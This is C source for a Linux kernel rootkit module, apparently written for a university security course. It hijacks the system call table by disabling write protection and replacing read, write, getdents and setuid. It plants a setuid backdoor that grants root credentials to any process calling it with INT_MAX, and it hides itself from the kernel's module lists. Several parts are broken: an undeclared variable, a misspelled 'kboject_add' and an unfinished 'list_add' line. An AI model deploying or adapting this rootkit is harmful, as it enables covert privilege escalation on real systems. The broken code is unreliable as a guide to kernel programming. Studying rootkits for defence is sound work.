#include "1337header.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("1337");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("This is a rootkit module written for a graduate computer security course at Stony Brook University. ");

unsigned long * sys_call_table;

asmlinkage int (*real_setuid) (uid_t uid);
asmlinkage int (*real_setuid32) (uid_t uid);
asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned int);
asmlinkage int (*real_getdents64) (unsigned int, struct linux_dirent64*, unsigned int);
asmlinkage long (*real_read)(unsigned int, char __user *, size_t);
asmlinkage long (*real_write)(unsigned int, char __user *, size_t);
extern asmlinkage long hijacked_read(unsigned int, char __user *, size_t);
extern asmlinkage long hijacked_write(unsigned int, char __user *, size_t);
extern asmlinkage int hijacked_getdents(unsigned int, struct linux_dirent, unsigned int);
extern asmlinkage int hijacked_getdents64(unsigned int, struct linux_dirent64, unsigned int);

static int rootkit_hidden = 0; //boolean flag desginating the hidden status for the rootkit
static struct list_head *prev_mod; //storing previous module object
static struct list_head *prev_kobj; //storing previous kernel object
/*
 * Hijacked setuid sets the ids of calling process to root if it
 * knows the secret of rootkit i.e calling process is malicious
 * uid: uid that needs to set or INT_MAX if uid needs to be set to 0
 */
asmlinkage int hijacked_setuid(uid_t uid){
	struct cred *new;
	/*
	 * If uid is INT_MAX, then the ids of the calling process will
	 * be set to root (0)
	 */
	if (uid == INT_MAX){
		new = prepare_creds();
                new->uid = 0;
                new->gid = 0;
                new->suid = 0;
                new->sgid = 0;
                new->euid = 0;
                new->egid = 0;
                new->fsuid = 0;
                new->fsgid = 0;
		/*
		 * Commit the new permission for calling (malicious) process
		 */
		return commit_creds(new);
	}
		/*
		 * By default call the original setuid syscall
		 */
		return real_setuid(uid);
}

/* make the address writable if it is write-protected.*/
int make_rw(unsigned long address){
	unsigned int level;
      	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
	pte->pte |= _PAGE_RW;
	return 0;
}

int make_ro(unsigned long address){
      unsigned int level;
      pte_t *pte = lookup_address(address, &level);
      pte->pte = pte->pte &~ _PAGE_RW;
      return 0;
}


void hijack_sys_call_table(void){

	/*
 	*Hijacking syscall table:
 	*make sys_call_table writable
 	*store unaltered syscalls
 	*then replace them in sys_call_table with our hijacked functions
 	*make sys_call_table read only again
 	*/

	make_rw((unsigned long)sys_call_table);
    real_getdents = (void*)*(sys_call_table + __NR_getdents);
    real_getdents64 = (void*)*(sys_call_table + __NR_getdents64);
    real_setuid = (void*)*(sys_call_table + __NR_setuid);
    real_setuid32 = (void*)*(sys_call_table + __NR_setuid32);
	real_read = (void*)*(sys_call_table + __NR_read);
	real_write = (void*)*(sys_call_table + __NR_write);
	*(sys_call_table + __NR_read) = (unsigned long)hijacked_read;
    *(sys_call_table + __NR_write) = (unsigned long)hijacked_write;
	*(sys_call_table + __NR_getdents) = (unsigned long)hijacked_getdents;
	*(sys_call_table + __NR_getdents64) = (unsigned long)hijacked_getdents64;
    *(sys_call_table + __NR_setuid) = (unsigned long)hijacked_setuid;
    *(sys_call_table + __NR_setuid32) = (unsigned long)hijacked_setuid;
	make_ro((unsigned long)sys_call_table);
}

/*
Remove our rootkit from list of modules and kernel objects.
*/
static void rootkit_hide(void) {

	if (rootkit_hidden) return;
	printk(KERN_INFO "hiding 1337rootkit\n");

	/*store the previous module of the list
	  then hide the rootkit module*/
	prev_mod = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	/*store the previous kernel object of the list
	  then hide the rootkit kernel object*/
	module_kobj_previous = THIS_MODULE->mkobj.kobj,entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry); 


	printk(KERN_INFO "1337rootkit hidden\n");
	rootkit_hidden = 1;
	return 0;
}

static void rootkit_show(void) {

	if (!rootkit_hidden) return;
	rootkit_hidden = 0;

	list_add(&THIS_MODULE->list, prev_mod);
	kboject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
	list_add
	
}

int init_module(void){
	
	/*
	 * pointer to the system call table. The address is currently hardcoded,
	 * taken from the /boot/System map file. This address seems to be same
	 * after every boot, so for now it can be hardcoded.
	 */

	//Edwin's syscall table address: 
	sys_call_table = (unsigned long*)0xc1688140;
	
	//sys_call_table = (unsigned long*)0xc15c3060;
	hijack_sys_call_table();
	//rootkit_hide();	
	


	printk(KERN_INFO "Rootkit added.\n\n");


	return 0;
}

void cleanup_module(void){

	//rootkit_show();
    make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_getdents) = (unsigned long)real_getdents;
	*(sys_call_table + __NR_getdents64) = (unsigned long)real_getdents64;
    *(sys_call_table + __NR_setuid) = (unsigned long)real_setuid;
    *(sys_call_table + __NR_setuid32) = (unsigned long)real_setuid32;
	*(sys_call_table + __NR_read) = (unsigned long)real_read;
    *(sys_call_table + __NR_write) = (unsigned long)real_write;
	make_ro((unsigned long)sys_call_table);
	printk(KERN_INFO "Rootkit removed.\n");
}
